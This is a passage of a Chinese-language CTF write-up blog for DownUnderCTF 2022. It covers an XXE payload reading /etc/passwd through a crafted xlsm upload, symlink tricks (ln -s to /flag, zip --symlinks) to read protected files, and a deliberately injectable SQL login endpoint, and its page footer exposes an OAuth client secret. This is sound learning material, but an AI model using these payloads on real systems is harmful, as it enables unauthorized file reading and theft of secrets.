+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/metadata&quot;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view_metadata</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;error_upload.html&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        f = request.files[<span class="string">&quot;file&quot;</span>]</span><br><span class="line">        </span><br><span class="line">        tmpFolder = <span class="string">&quot;./uploads/&quot;</span> + <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line">        os.mkdir(tmpFolder)</span><br><span class="line">        filename = tmpFolder + <span class="string">&quot;/&quot;</span> + secure_filename(f.filename)</span><br><span class="line">        f.save(filename)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            properties = getMetadata(filename)</span><br><span class="line">            extractWorkbook(filename, tmpFolder)</span><br><span class="line">            workbook = tmpFolder + <span class="string">&quot;/&quot;</span> + WORKBOOK</span><br><span class="line">            properties.append(findInternalFilepath(workbook))</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;error_upload.html&quot;</span>)</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            shutil.rmtree(tmpFolder)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;metadata.html&quot;</span>, items=properties)</span><br></pre></td></tr></table></figure>
+
+<p>搭一下环境 自己上传一个试试，，，</p>
+<p>找能读文件的点 ccc</p>
+<p>咋感觉是个 blind xxe </p>
+<p>如果能想办法控制这个 xml文件 就可以打xxe那一套了</p>
+<p><img src="/2022/09/24/DownUnderCTF/image-20220924154358201.png" alt="image-20220924154358201"></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_50854790/article/details/125599901">https://blog.csdn.net/qq_50854790/article/details/125599901</a></p>
+<p>制作一个 xslm</p>
+<p><img src="/2022/09/24/DownUnderCTF/image-20220924161851727.png" alt="image-20220924161851727"></p>
+<p>想办法写到这个text里面，，，</p>
+<p>构造payload</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">data</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">data</span> <span class="keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">x15ac:absPath</span> <span class="attr">url</span>=<span class="string">&quot;/Users/Shared/&quot;</span></span></span><br><span class="line"><span class="tag">                   <span class="attr">xmlns:x15ac</span>=<span class="string">&quot;http://schemas.microsoft.com/office/spreadsheetml/2010/11/ac&quot;</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">x15ac:absPath</span>&gt;</span><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>再压缩回去 改名即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 压缩文件</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">zip_file</span>(<span class="params">src_dir</span>):</span><br><span class="line">    zip_name = src_dir +<span class="string">&#x27;.zip&#x27;</span></span><br><span class="line">    z = zipfile.ZipFile(zip_name,<span class="string">&#x27;w&#x27;</span>,zipfile.ZIP_DEFLATED)</span><br><span class="line">    <span class="keyword">for</span> dirpath, dirnames, filenames <span class="keyword">in</span> os.walk(src_dir):</span><br><span class="line">        fpath = dirpath.replace(src_dir,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        fpath = fpath <span class="keyword">and</span> fpath + os.sep <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> filename <span class="keyword">in</span> filenames:</span><br><span class="line">            z.write(os.path.join(dirpath, filename),fpath+filename)</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&#x27;==压缩成功==&#x27;</span>)</span><br><span class="line">    z.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    zip_file(<span class="string">&#x27;exp&#x27;</span>)</span><br><span class="line">    os.remove(<span class="string">&#x27;exp.xlsm&#x27;</span>)</span><br><span class="line">    os.rename(<span class="string">&#x27;exp.zip&#x27;</span>,<span class="string">&#x27;./exp.xlsm&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="no-symlink"><a href="#no-symlink" class="headerlink" title="no-symlink"></a>no-symlink</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">I heard symlinks are really dangerous so I <span class="keyword">delete</span> them all <span class="keyword">and</span> keep <span class="keyword">my</span> secrets safe.</span><br><span class="line">Author: hashkitten</span><br><span class="line">https:<span class="regexp">//</span>web-<span class="keyword">no</span>-<span class="keyword">symlink</span>-<span class="number">821</span>c2e0dbc5e.<span class="number">2022</span>.ductf.dev</span><br></pre></td></tr></table></figure>
+
+<p>这是啥题？ ruby？</p>
+<p>flag 就在 /flag</p>
+<p>这软链接咋链o.o</p>
+<p>先去回顾一下以前学到的东西o.o justctf2022</p>
+<blockquote>
+<p>**  ——  递归匹配所有目录。 它用于下降到目录树中并在当前目录的子目录中查找所有文件，而不仅仅是在当前目录中的文件。 在下面的示例代码中对此通配符进行了研究。</p>
+<p>*****    –—-   匹配零个或多个字符。 仅由星号组成且没有其他字符或通配符的全局名称将匹配当前目录中的所有文件。 如果没有更多字符，星号通常与文件扩展名结合使用以缩小搜索范围。</p>
+</blockquote>
+<p>不能有 <code>.</code> <code>..</code></p>
+<p>不能有空文件夹</p>
+<p>不能有 <code>File.symlink</code> 判断出来的东西 这里估计还要看文档</p>
+<p>source code</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> VALUE</span></span><br><span class="line"><span class="function"><span class="title">rb_file_symlink_p</span><span class="params">(VALUE obj, VALUE fname)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> S_ISLNK</span></span><br><span class="line"><span class="meta">#  <span class="keyword">ifdef</span> _S_ISLNK</span></span><br><span class="line"><span class="meta">#    <span class="keyword">define</span> S_ISLNK(m) _S_ISLNK(m)</span></span><br><span class="line"><span class="meta">#  <span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#    <span class="keyword">ifdef</span> _S_IFLNK</span></span><br><span class="line"><span class="meta">#      <span class="keyword">define</span> S_ISLNK(m) (((m) &amp; S_IFMT) == _S_IFLNK)</span></span><br><span class="line"><span class="meta">#    <span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#      <span class="keyword">ifdef</span> S_IFLNK</span></span><br><span class="line"><span class="meta">#        <span class="keyword">define</span> S_ISLNK(m) (((m) &amp; S_IFMT) == S_IFLNK)</span></span><br><span class="line"><span class="meta">#      <span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#    <span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#  <span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> S_ISLNK</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">stat</span> st;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">FilePathValue</span>(fname);</span><br><span class="line">    fname = <span class="built_in">rb_str_encode_ospath</span>(fname);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">lstat_without_gvl</span>(<span class="built_in">StringValueCStr</span>(fname), &amp;st) &lt; <span class="number">0</span>) <span class="keyword">return</span> Qfalse;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">S_ISLNK</span>(st.st_mode)) <span class="keyword">return</span> Qtrue;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Qfalse;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/241148#h3-2">Proc 目录在 CTF 中的利用-安全客 - 安全资讯平台 (anquanke.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/file-upload#symlink">File Upload - HackTricks</a></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ln -s ../../../index<span class="selector-class">.php</span> symindex<span class="selector-class">.txt</span></span><br><span class="line">zip <span class="attr">--symlinks</span> test<span class="selector-class">.zip</span> symindex<span class="selector-class">.txt</span></span><br><span class="line">tar -cvf test<span class="selector-class">.tar</span> symindex.txt</span><br></pre></td></tr></table></figure>
+
+<p>先来搞个软链接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /flag sym.txt</span><br></pre></td></tr></table></figure>
+
+<p>然后对软链接进行魔改？</p>
+<p>找到描述symlink形式的文档o.o</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s <span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root/flag sysla.txt</span><br></pre></td></tr></table></figure>
+
+<p>没p用 是不是权限上的问题？？？</p>
+<p>果然是权限上的问题 呜呜呜 当时一直在想怎么改symlink的权限 结果忘了可以加到上层文件夹上，，，</p>
+<h3 id="sol-3"><a href="#sol-3" class="headerlink" title="sol"></a>sol</h3><p>把软链接上层文档的权限给改了就ok 呜呜呜 <code>chmod 100 fuck</code></p>
+<p><img src="/2022/09/24/DownUnderCTF/image-20220925182116181.png" alt="image-20220925182116181"></p>
+<p><img src="/2022/09/24/DownUnderCTF/image-20220925181933001.png" alt="image-20220925181933001"></p>
+<h2 id="sqli2022"><a href="#sqli2022" class="headerlink" title="sqli2022"></a>sqli2022</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> textwrap</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(os.environ[<span class="string">&#x27;FLAG&#x27;</span>]) &gt; <span class="number">32</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">root_post</span>():</span><br><span class="line">    post = request.form</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Sent params?</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> post <span class="keyword">or</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> post:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Username or password missing from request&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># We are recreating this every request</span></span><br><span class="line">    con = sqlite3.connect(<span class="string">&#x27;:memory:&#x27;</span>)</span><br><span class="line">    cur = con.cursor()</span><br><span class="line">    cur.execute(<span class="string">&#x27;CREATE TABLE users (username TEXT, password TEXT)&#x27;</span>)</span><br><span class="line">    cur.execute(</span><br><span class="line">        <span class="string">&#x27;INSERT INTO users VALUES (&quot;admin&quot;, ?)&#x27;</span>,</span><br><span class="line">        [hashlib.md5(os.environ[<span class="string">&#x27;FLAG&#x27;</span>].encode()).hexdigest()]</span><br><span class="line">    )</span><br><span class="line">    output = cur.execute(</span><br><span class="line">        <span class="string">&#x27;SELECT * FROM users WHERE username = &#123;post[username]!r&#125; AND password = &#123;post[password]!r&#125;&#x27;</span></span><br><span class="line">        .<span class="built_in">format</span>(post=post)</span><br><span class="line">    ).fetchone()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Credentials OK?</span></span><br><span class="line">    <span class="keyword">if</span> output <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Wrong credentials&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Nothing suspicious?</span></span><br><span class="line">    username, password = output</span><br><span class="line">    <span class="keyword">if</span> username != post[<span class="string">&quot;username&quot;</span>] <span class="keyword">or</span> password != post[<span class="string">&quot;password&quot;</span>]:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Wrong credentials (are we being hacked?)&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Everything is all good</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;Welcome back <span class="subst">&#123;post[<span class="string">&quot;username&quot;</span>]&#125;</span>! The flag is in FLAG.&#x27;</span>.<span class="built_in">format</span>(post=post)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">root_get</span>():</span><br><span class="line">    <span class="keyword">return</span> textwrap.dedent(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">       &lt;html&gt;</span></span><br><span class="line"><span class="string">         &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">         &lt;body&gt;</span></span><br><span class="line"><span class="string">           &lt;form action=&quot;/&quot; method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">             &lt;p&gt;Welcome to admin panel!&lt;/p&gt;</span></span><br><span class="line"><span class="string">             &lt;label for=&quot;username&quot;&gt;Username:&lt;/label&gt;</span></span><br><span class="line"><span class="string">             &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot;&gt;&lt;br&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">             &lt;label for=&quot;password&quot;&gt;Password:&lt;/label&gt;</span></span><br><span class="line"><span class="string">             &lt;input type=&quot;text&quot; id=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">             &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;</span></span><br><span class="line"><span class="string">          &lt;/form&gt; </span></span><br><span class="line"><span class="string">         &lt;/body&gt;</span></span><br><span class="line"><span class="string">       &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>).strip()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>b1ue0cean
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="http://example.com/2022/09/24/DownUnderCTF/" title="DownUnderCTF 2022 writeup">http://example.com/2022/09/24/DownUnderCTF/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+        <a target="_blank" class="social-link" href="https://twitter.com/b1ue0cean7">
+          <span class="icon">
+            <i class="fab fa-twitter"></i>
+          </span>
+
+          <span class="label">Twitter</span>
+        </a>
+      </div>
+
+      <div class="social-item">
+        <a target="_blank" class="social-link" href="/atom.xml">
+          <span class="icon">
+            <i class=""></i>
+          </span>
+
+          <span class="label">RSS</span>
+        </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+              <a href="/tags/writeup/" rel="tag"># writeup</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/09/22/N-beats-learning/" rel="prev" title="N-beats learning">
+                  <i class="fa fa-chevron-left"></i> N-beats learning
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"godrun666","repo":"godrun666.github.io","client_id":"7f8a0f5a5c88a0fea952","client_secret":"57250fa3a3b4cb1d0e0dad43bb1fffe7355d61a8","admin_user":"godrun666","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":null,"js":{"url":"https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js","integrity":"sha256-Pmj85ojLaPOWwRtlMJwmezB/Qg8BzvJp5eTzvXaYAfA="},"path_md5":"70c9353225c70b601d93551e709efded"}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+
+</body>
+</html>
